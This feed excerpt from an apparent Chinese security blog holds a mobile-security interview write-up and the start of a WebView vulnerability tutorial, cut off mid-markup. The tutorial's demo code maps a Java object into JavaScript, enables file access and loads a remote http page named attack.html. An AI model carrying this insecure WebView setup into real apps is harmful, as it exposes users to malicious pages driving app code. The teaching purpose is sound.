    <content type="html"><![CDATA[<p>大家好！我是同学小B（小编修改），某末流985硕，我也分享一下我秋招其中一家公司的心得。作为一名研究生期间没有什么成果的同学，这里还希望各位大佬见谅！首先介绍一下本人，我是从事数据安全方向，之前实验室的一些项目中，也初步接触过移动安全的部分知识，不过大多是和隐私合规相关，不过在今年如此之卷的秋招，我处处碰壁后，就开始扩展了一下自己的知识面，进一步将移动安全的隐私合规的一些知识完善了一下。本人秋招期间应聘两家公司的移动安全岗位（科大讯飞和海康威视），今天和大家分享一下其中一家公司的面试心得。</p><span id="more"></span><p>科大讯飞的面试总共有四轮：1轮hr综合面试 + 1轮技术初试  + 1轮技术复试  + 1轮技术加试</p><p>**hr综合面试 **</p><p>有一说一，科大讯飞这家面试是我遇到最奇怪，居然上来是hr综合面试，不过面试官都比较和蔼，hr面试基本和其他没有什么区别，很多其实就是考察你的表达能力，或者你的一些逻辑思维能力，比如他们会问：</p><p>你为什么会选择做移动安全？</p><p>你怎么规划你平时的学习的？</p><p>你觉得工作之后怎么能进一步提升自己？</p><p>你曾经遇到的最困难的事？</p><p>考研为什么要跨考？</p><p>等等</p><p>我感觉其实大家hr面，只要放平心态都没什么问题。</p><p><strong>第一轮技术初试：</strong></p><p>第一轮初试是一个女面试官，在我面试那么多家公司，遇到安全类女面试官的次数好像还没有，对方也是很和蔼，问了一些我数据安全（分类分级、数据脱敏类的问题），侧重就放在隐私合规上面了。移动安全相关大概有：</p><p>你了解哪些移动端的隐私合规检测的工具？</p><p>你如何开展隐私合规检测的工作？</p><p>静态检测和动态检测的优劣是什么？</p><p>如果你来做隐私合规检测，你觉得现在行业内比较通用的方法是什么?</p><p>(这里说实在很多我都是死记硬背，当时看了看平安的隐私合规沙龙以及群主星球类的一些知识，就背下来了)</p><p>其中静态检测我说了更多关于nlp相关的东西，因为做数据分类分级的过程中对这些要擅长一点，平时和群主聊天也相互交流了一下，感觉还好。</p><p>然后就是问了一下规则与nlp的优劣，当前nlp存在的一些问题</p><p>基本这里就大致介绍，后面很多就是介绍科大他们的一些产品等等了</p><p><strong>第二轮技术复试：</strong></p><p>第二轮技术复试应该是他们的一个安全小组长的人吧，然后问的基本就是移动端相关的知识了</p><p>隐私方面：</p><p>主要问了一下项目的细节，里面隐私合规如何做到自动化的方法，其他倒是没有什么区别？</p><p>移动端：</p><p>Android里面的调试策略？反调试策略？怎么绕开反调试？针对你绕开反调试的方法怎么进行反制？</p><p>这里就回答了个一半吧</p><p>Android的脱壳技术了解么（这个我不太了解，就没继续问了）</p><p>如何开发自动化的隐私合规检测工具，说一下思路？</p><p>隐私合规动态检测有哪些方法？Xposed与frida的区别？</p><p>等等</p><p>后面就是同样的提问环节，通过询问好像科大里面移动安全就需求较少，不过问我后面除了做隐私合规，还可不可以做漏洞相关，我都表示可以，就结束了</p><p><strong>第三轮技术加试：</strong></p><p>本来我以为到第二轮结束，应该就完了，感觉也没啥问题要问的了。第三轮技术面试问的更多的是简历，将简历上项目都询问了一遍，然后问我预期薪资，我报了个中等的薪资，然后问了下期望的城市和手里有几个offer，大致这些情况就结束了。</p><p>整体情况就是这些，很高兴能分享我的面试心得，希望能帮助到大家！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小B（小编修改），某末流985硕，我也分享一下我秋招其中一家公司的心得。作为一名研究生期间没有什么成果的同学，这里还希望各位大佬见谅！首先介绍一下本人，我是从事数据安全方向，之前实验室的一些项目中，也初步接触过移动安全的部分知识，不过大多是和隐私合规相关，不过在今年如此之卷的秋招，我处处碰壁后，就开始扩展了一下自己的知识面，进一步将移动安全的隐私合规的一些知识完善了一下。本人秋招期间应聘两家公司的移动安全岗位（科大讯飞和海康威视），今天和大家分享一下其中一家公司的面试心得。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（20）——Webview漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0020/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0020/</id>
    <published>2023-02-14T01:09:19.000Z</published>
    <updated>2023-12-23T09:13:44.114Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。</p><span id="more"></span><p>本文第二节讲述WebView的基本知识</p><p>本文第三节讲述WebView的漏洞面</p><p>本文第四节进行了漏洞原理介绍和漏洞复现</p><p>总结：本文从WebView开发出发，从0开始进行漏洞的讲解和复现，花了几天时间，列举了WebView中的20多种漏洞案例，并手动复现了其中十余种案例，希望用这篇万字长文介绍WebView漏洞的基本发展。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-WebView基础"><a href="#1-WebView基础" class="headerlink" title="1.WebView基础"></a>1.WebView基础</h3><h4 id="（1）WebView概述"><a href="#（1）WebView概述" class="headerlink" title="（1）WebView概述"></a>（1）WebView概述</h4><p>Android WebView在Android平台上是一个特殊的View，它能用来显示网页，这个WebView类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。</p><p>WebView内部实现是采用渲染引擎(WebKit)来展示view的内容，提供网页前进后退、网页放大、缩小、搜索等功能。Android WebView 在低版本和高版本采用了不同的 webkit 版本内核，在 4.4 版本后使用 Chrome 内核。</p><h4 id="（2）WebView作用"><a href="#（2）WebView作用" class="headerlink" title="（2）WebView作用"></a>（2）WebView作用</h4><ul><li>显示和渲染Web页面</li><li>直接使用html文件（网络上或本地assets中）作布局</li><li>可和JavaScript交互调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView控件功能强大，除了具有一般View的属性和设置外，还可以对url请求、页面加载、渲染、页面交互进行强大的处理。</span><br></pre></td></tr></table></figure><h4 id="（3）WebView基础使用"><a href="#（3）WebView基础使用" class="headerlink" title="（3）WebView基础使用"></a>（3）WebView基础使用</h4><h5 id="lt-1-gt-本地加载"><a href="#lt-1-gt-本地加载" class="headerlink" title="&lt;1&gt;本地加载"></a>&lt;1&gt;本地加载</h5><p>Web最简单显示网页内容，基本步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在布局文件中添加WebView控件；</span><br><span class="line">2.在代码中让WebView控件加载显示网页。</span><br></pre></td></tr></table></figure><p>具体操作：</p><p>首先，我们在布局文件中来添加WebView控件，如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png" alt="image-20220726171401583"></p><p>然后我们在代码中让WebView控件加载显示网页，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/2.png" alt="image-20220726171554052"></p><p>最后我们在配置文件中添加网络权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加网络权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/3.png" alt="image-20220726171648967"></p><p>运行程序，显示如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/4.png" alt="image-20220726171737615"></p><h5 id="lt-2-gt-远程加载"><a href="#lt-2-gt-远程加载" class="headerlink" title="&lt;2&gt;远程加载"></a>&lt;2&gt;远程加载</h5><p>首先，我们直接在本地新建js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/26.png" alt="image-20220729155049524"></p><p>然后我们开启一个简易的http_server的监听</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/27.png" alt="image-20220729155135353"></p><p>我们编写代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再次运行程序</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/28.png" alt="image-20220729155443281"></p><p>这里就说明我们远程加载文件成功了，我们点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/29.png" alt="image-20220729160726979"></p><p>可以发现可以成功的通过JS调用Android代码</p><h3 id="2-WebView使用详解"><a href="#2-WebView使用详解" class="headerlink" title="2.WebView使用详解"></a>2.WebView使用详解</h3><h4 id="（1）WebView常用方法"><a href="#（1）WebView常用方法" class="headerlink" title="（1）WebView常用方法"></a>（1）WebView常用方法</h4><p><strong>WebView的状态：</strong></p><p>webView.onResume();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 激活WebView为活跃状态，能正常执行网页的响应</span><br></pre></td></tr></table></figure><p>webView.onPause();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当页面被失去焦点被切换到后台不可见状态，需要执行onPause</span><br><span class="line">// 通过onPause动作通知内核暂停所有的动作，比如DOM的解析、plugin的执行、JavaScript执行。</span><br></pre></td></tr></table></figure><p>webView.pauseTimers()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当应用程序(存在webview)被切换到后台时，这个方法不仅仅针对当前的webview而是全局的全应用程序的webview</span><br><span class="line">// 它会暂停所有webview的layout，parsing，javascripttimer。降低CPU功耗。</span><br></pre></td></tr></table></figure><p>webView.resumeTimers()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 恢复pauseTimers状态</span><br></pre></td></tr></table></figure><p>rootLayout.removeView(webView)</p><p>webView.destory()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// webview调用destory时，webview仍绑定在Activity上</span><br><span class="line">// 需要先从父容器中移除webview，然后再销毁webview</span><br></pre></td></tr></table></figure><p><strong>前进、后退网页</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是否可以后退</span></span><br><span class="line">Webview.canGoBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//后退网页</span></span><br><span class="line">Webview.goBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否可以前进</span></span><br><span class="line">Webview.canGoForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//前进网页</span></span><br><span class="line">Webview.goForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//以当前的index为起始点前进或者后退到历史记录中指定的steps</span></span><br><span class="line"><span class="comment">//如果steps为负数则为后退，正数则为前进</span></span><br><span class="line">Webview.goBackOrForward(intsteps)</span><br></pre></td></tr></table></figure><p>在不做任何处理前提下，浏览网页时点击系统的“Back”键时，整个 Browser 会调用 finish()而结束自身，因此需要在当前Activity中处理并消费掉该 Back 事件，当按下返回键时，调用goBack方法。</p><p>我们可以做一些处理，让点击“Back”键后，让网页返回上一页而不是直接退出浏览器，此时我们可以在当前的Activity中处理Back事件，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode, KeyEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((keyCode == KEYCODE_BACK) &amp;&amp; mWebView.canGoBack()) &#123;</span><br><span class="line">         mWebView.goBack();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode, event);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>清除缓存数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//清除网页访问留下的缓存</span><br><span class="line">//由于内核缓存是全局的因此这个方法不仅仅针对webview而是针对整个应用程序.</span><br><span class="line">Webview.clearCache(true);</span><br><span class="line"></span><br><span class="line">//清除当前webview访问的历史记录</span><br><span class="line">//只会webview访问历史记录里的所有记录除了当前访问记录</span><br><span class="line">Webview.clearHistory()；</span><br><span class="line"></span><br><span class="line">//这个api仅仅清除自动完成填充的表单数据，并不会清除WebView存储到本地的数据</span><br><span class="line">Webview.clearFormData()；</span><br></pre></td></tr></table></figure><h4 id="（2）常用类"><a href="#（2）常用类" class="headerlink" title="（2）常用类"></a>（2）常用类</h4><h5 id="lt-1-gt-WebSettings类"><a href="#lt-1-gt-WebSettings类" class="headerlink" title="&lt;1&gt;WebSettings类"></a><strong>&lt;1&gt;WebSettings类</strong></h5><p>作用：对WebView进行配置和管理</p><p>配置步骤：</p><p>第一步：添加访问网络权限（AndroidManifest.xml）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br></pre></td></tr></table></figure><p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p><p>第二步：生成一个WebView组件（有两种方式）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure><p>第三步：进行配置-利用WebSettings子类（常见方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//设置自适应屏幕，两者合用</span></span><br><span class="line">webSettings.setUseWideViewPort(<span class="literal">true</span>); <span class="comment">//将图片调整到适合webview的大小</span></span><br><span class="line">webSettings.setLoadWithOverviewMode(<span class="literal">true</span>); <span class="comment">// 缩放至屏幕的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//缩放操作</span></span><br><span class="line">webSettings.setSupportZoom(<span class="literal">true</span>); <span class="comment">//支持缩放，默认为true。是下面那个的前提。</span></span><br><span class="line">webSettings.setBuiltInZoomControls(<span class="literal">true</span>); <span class="comment">//设置内置的缩放控件。若为false，则该WebView不可缩放</span></span><br><span class="line">webSettings.setDisplayZoomControls(<span class="literal">false</span>); <span class="comment">//隐藏原生的缩放控件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其他细节操作</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); <span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>); <span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>); <span class="comment">//支持通过JS打开新窗口</span></span><br><span class="line">webSettings.setLoadsImagesAutomatically(<span class="literal">true</span>); <span class="comment">//支持自动加载图片</span></span><br><span class="line">webSettings.setDefaultTextEncodingName(<span class="string">&quot;utf-8&quot;</span>);<span class="comment">//设置编码格式</span></span><br></pre></td></tr></table></figure><p>常见方法：设置WebView缓存</p><ul><li>当加载 html 页面时，WebView会在&#x2F;data&#x2F;data&#x2F;包名目录下生成 database 与 cache 两个文件夹</li><li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li><li>是否启用缓存：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优先使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓存模式如下：</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ONLY: 不使用网络，只读取本地缓存数据</span></span><br><span class="line">    <span class="comment">//LOAD_DEFAULT: （默认）根据cache-control决定是否从网络上取数据。</span></span><br><span class="line">    <span class="comment">//LOAD_NO_CACHE: 不使用缓存，只从网络获取数据.</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ELSE_NETWORK，只要本地有，无论是否过期，或者no-cache，都使用缓存中的数据</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-WebViewClient类"><a href="#lt-2-gt-WebViewClient类" class="headerlink" title="&lt;2&gt;WebViewClient类"></a><strong>&lt;2&gt;WebViewClient类</strong></h5><p>用来处理各种通知 &amp; 请求事件</p><p><strong>shouldOverrideUrlLoading()</strong></p><p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Webview控件</span></span><br><span class="line"><span class="type">Webview</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载一个网页</span></span><br><span class="line">webView.loadUrl(<span class="string">&quot;http://www.google.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示</span></span><br><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">           view.loadUrl(url);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>onPageStarted()</strong></p><p>作用：开始载入页面调用的，我们可以设定一个loading的页面，告诉用户程序在等待网络响应。</p><figure class="highlight 